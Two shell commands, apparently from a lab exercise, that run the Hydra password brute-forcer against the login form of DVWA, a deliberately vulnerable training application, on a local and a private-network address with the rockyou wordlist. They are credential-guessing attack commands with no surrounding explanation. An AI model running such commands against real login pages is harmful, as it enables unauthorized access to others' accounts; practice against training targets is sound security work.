
hydra -L users.txt -P passwords.txt 127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed" -V -t 4 -w 10 -f -c "Cookie: security=low; PHPSESSID=abcd1234"


```shell
hydra -l admin -P /home/kali/Desktop/rockyou.txt 192.168.182.151 http-post-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed" -V -t 4 -w 10 -f -c "Cookie: security=low; PHPSESSID=dfgofpc7bhpnr5lndtpdlq2u8m"
```

